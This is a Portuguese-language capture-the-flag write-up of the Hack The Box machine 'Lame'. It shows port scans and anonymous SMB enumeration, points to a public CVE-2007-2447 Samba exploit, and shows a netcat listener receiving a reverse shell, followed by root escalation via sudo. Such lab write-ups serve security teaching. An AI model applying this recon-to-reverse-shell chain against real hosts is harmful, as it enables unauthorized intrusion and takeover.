#ctfs 

Dado o IP inicial, comecei com um scan de portas via `nmap`.

```shell
└─$ nmap 10.129.56.24 --open -Pn -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-05 20:04 -03
Nmap scan report for 10.129.56.24
Host is up (0.27s latency).
Not shown: 65530 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd

Nmap done: 1 IP address (1 host up) scanned in 41131.62 seconds
```

Temos 5 portas abertas, nenhuma página Web. Observem que há um SMB aberto (porta 445), vamos aprofundar um pouco mais nossa varredura.


```shell
└─$ nmap 10.129.56.24 --open -Pn -p 21,22,139,445,3632 -sV
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-06 07:51 -03
Nmap scan report for 10.129.56.24
Host is up (0.27s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
```

Agora que temos uma visão mais completa da nossa superfície de ataque, vamos focar nossos esforços no SMB.

```shell
└─$ smbclient -L \\10.129.56.24 -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (lame server (Samba 3.0.20-Debian))
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            LAME
```

Temos alguns compartilhamentos disponíveis via null section, vamos explorar o compartilhamento `tmp`

```shell
└─$ smbclient //10.129.56.24/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Aug  6 08:25:19 2026
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  orbit-makis                        DR        0  Thu Aug  6 07:25:31 2026
  5624.jsvc_up                        R        0  Wed Aug  5 20:05:07 2026
  .ICE-unix                          DH        0  Wed Aug  5 20:03:56 2026
  vmware-root                        DR        0  Wed Aug  5 20:04:31 2026
  .X11-unix                          DH        0  Wed Aug  5 20:04:22 2026
  gconfd-makis                       DR        0  Thu Aug  6 07:25:31 2026
  .X0-lock                           HR       11  Wed Aug  5 20:04:22 2026
  vgauthsvclog.txt.0                  R     1600  Wed Aug  5 20:03:55 2026

                7282168 blocks of size 1024. 5385280 blocks available
```

Após uma rápida análise dos diretórios não encontramos nada de interessante no compartilhamento.
Vamos utilizar uma ferramenta mais voltada a enumeração do SMB, o `enum4linux-ng`. Após rodar o comando `enum4linux-ng -A 10.129.56.24 -oA ./Lame` chegamos ao seguinte resultado com output formato JSON

```json
{
    "target": {
        "host": "10.129.56.24"
    },
    "credentials": {
        "auth_method": "null",
        "user": "",
        "password": "",
        "domain": "",
        "ticket_file": "",
        "nthash": "",
        "random_user": "btxzyvce"
    },
    "listeners": {
        "LDAP": {
            "port": 389,
            "accessible": false
        },
        "LDAPS": {
            "port": 636,
            "accessible": false
        },
        "SMB": {
            "port": 445,
            "accessible": true
        },
        "SMB over NetBIOS": {
            "port": 139,
            "accessible": true
        }
    },
    "domain": null,
    "nmblookup": null,
    "smb_dialects": true,
    "smb_domain_info": {
        "NetBIOS computer name": "LAME",
        "NetBIOS domain name": "",
        "DNS domain": "hackthebox.gr",
        "FQDN": "lame.hackthebox.gr",
        "Derived membership": "workgroup member",
        "Derived domain": "unknown"
    },
    "sessions": {
        "sessions_possible": true,
        "null": true,
        "password": false,
        "Kerberos": false,
        "NTLM": false,
        "guest": false
    },
    "rpc_domain_info": {
        "Domain": "WORKGROUP",
        "Domain SID": "NULL SID",
        "Membership": "workgroup member"
    },
    "os_info": {
        "OS": "Linux/Unix (Samba 3.0.20-Debian)",
        "OS version": "4.9",
        "OS release": "not supported",
        "OS build": "not supported",
        "Native OS": "Unix",
        "Native LAN manager": "Samba 3.0.20-Debian",
        "Platform id": "500",
        "Server type": "0x9a03",
        "Server type string": "Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian)"
    },
    "users": {
        "1010": {
            "username": "games",
            "name": "games",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "501": {
            "username": "nobody",
            "name": "nobody",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1210": {
            "username": "bind",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1026": {
            "username": "proxy",
            "name": "proxy",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1204": {
            "username": "syslog",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "3002": {
            "username": "user",
            "name": "just a user,111,,",
            "acb": "0x00000010",
            "description": "(null)"
        },
        "1066": {
            "username": "www-data",
            "name": "www-data",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1000": {
            "username": "root",
            "name": "root",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1018": {
            "username": "news",
            "name": "news",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1216": {
            "username": "postgres",
            "name": "PostgreSQL administrator,,,",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1004": {
            "username": "bin",
            "name": "bin",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1016": {
            "username": "mail",
            "name": "mail",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1222": {
            "username": "distccd",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1226": {
            "username": "proftpd",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1202": {
            "username": "dhcp",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1002": {
            "username": "daemon",
            "name": "daemon",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1208": {
            "username": "sshd",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1012": {
            "username": "man",
            "name": "man",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1014": {
            "username": "lp",
            "name": "lp",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1218": {
            "username": "mysql",
            "name": "MySQL Server,,,",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1082": {
            "username": "gnats",
            "name": "Gnats Bug-Reporting System (admin)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1200": {
            "username": "libuuid",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1068": {
            "username": "backup",
            "name": "backup",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "3000": {
            "username": "msfadmin",
            "name": "msfadmin,,,",
            "acb": "0x00000010",
            "description": "(null)"
        },
        "1224": {
            "username": "telnetd",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1006": {
            "username": "sys",
            "name": "sys",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1206": {
            "username": "klog",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1212": {
            "username": "postfix",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "3004": {
            "username": "service",
            "name": ",,,",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1076": {
            "username": "list",
            "name": "Mailing List Manager",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1078": {
            "username": "irc",
            "name": "ircd",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1214": {
            "username": "ftp",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1220": {
            "username": "tomcat55",
            "name": "(null)",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1008": {
            "username": "sync",
            "name": "sync",
            "acb": "0x00000011",
            "description": "(null)"
        },
        "1020": {
            "username": "uucp",
            "name": "uucp",
            "acb": "0x00000011",
            "description": "(null)"
        }
    },
    "groups": {},
    "shares": {
        "print$": {
            "type": "Disk",
            "comment": "Printer Drivers",
            "access": {
                "mapping": "denied",
                "listing": "n/a"
            }
        },
        "tmp": {
            "type": "Disk",
            "comment": "oh noes!",
            "access": {
                "mapping": "ok",
                "listing": "ok"
            }
        },
        "opt": {
            "type": "Disk",
            "comment": "",
            "access": {
                "mapping": "denied",
                "listing": "n/a"
            }
        },
        "IPC$": {
            "type": "IPC",
            "comment": "IPC Service (lame server (Samba 3.0.20-Debian))",
            "access": {
                "mapping": "ok",
                "listing": "not supported"
            }
        },
        "ADMIN$": {
            "type": "IPC",
            "comment": "IPC Service (lame server (Samba 3.0.20-Debian))",
            "access": {
                "mapping": "denied",
                "listing": "n/a"
            }
        }
    },
    "policy": {
        "Domain password information": {
            "Password history length": "None",
            "Minimum password length": 5,
            "Minimum password age": "none",
            "Maximum password age": "not set",
            "Password properties": [
                {
                    "DOMAIN_PASSWORD_COMPLEX": false
                },
                {
                    "DOMAIN_PASSWORD_NO_ANON_CHANGE": false
                },
                {
                    "DOMAIN_PASSWORD_NO_CLEAR_CHANGE": false
                },
                {
                    "DOMAIN_PASSWORD_LOCKOUT_ADMINS": false
                },
                {
                    "DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT": false
                },
                {
                    "DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE": false
                }
            ]
        },
        "Domain lockout information": {
            "Lockout observation window": "30 minutes",
            "Lockout duration": "30 minutes",
            "Lockout threshold": "None"
        },
        "Domain logoff information": {
            "Force logoff time": "not set"
        }
    },
    "printers": {},
    "errors": {
        "listeners": {
            "enum_listeners": [
                "Could not connect to LDAP on 389/tcp: timed out",
                "Could not connect to LDAPS on 636/tcp: timed out"
            ]
        },
        "nmblookup": {
            "enum_netbios": [
                "Could not get NetBIOS names information via 'nmblookup': timed out"
            ]
        },
        "domain": {
            "enum_netbios": [
                "Could not get NetBIOS names information via 'nmblookup': timed out"
            ]
        },
        "sessions": {
            "enum_sessions": [
                "Could not establish guest session: STATUS_LOGON_FAILURE"
            ]
        }
    }
}
```

Através da versão do SMB conseguimos achar um exploit na internet através do [CVE-2007-2447](https://github.com/amriunix/cve-2007-2447), vulnerabilidade na qual executa-se um RCE (o qual nos traz, por consequência, uma shell reversa)

```shell
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [xxxxxxxxx] from (UNKNOWN) [10.129.56.24] 38413
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
initrd.img.old
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
```

Como queremos a flag de user basta achar a pasta do usuário no sistema (`/home/makis`)

```shell
cd makis
ls -la
total 36
drwxr-xr-x  4 makis makis 4096 Aug  6 06:25 .
drwxr-xr-x  6 root  root  4096 Mar 14  2017 ..
-rw-------  1 makis makis 1107 Mar 14  2017 .bash_history
-rw-r--r--  1 makis makis  220 Mar 14  2017 .bash_logout
-rw-r--r--  1 makis makis 2928 Mar 14  2017 .bashrc
drwx------  2 makis makis 4096 Aug  6 06:25 .gconf
drwx------  2 makis makis 4096 Aug  6 06:25 .gconfd
-rw-r--r--  1 makis makis  586 Mar 14  2017 .profile
-rw-r--r--  1 makis makis    0 Mar 14  2017 .sudo_as_admin_successful
-rw-r--r--  1 makis makis   33 Aug  5 19:04 user.txt
cat user.txt
[FLAG USER]
```

Fechamos a flag de usuário, precisamos escalar privilégios.

Primeiro, vamos verificar quais permissões de usuário nós temos via `sudo -l`

```shell
sudo -l
User root may run the following commands on this host:
    (ALL) ALL
```

Ou seja, temos permissão total! Basta dar `sudo -l`e conseguimos subir para root.

```shell
sudo su
whoami
root
cd /root
cat root.txt
[FLAG root]
```

E assim encerra-se nosso CTF.

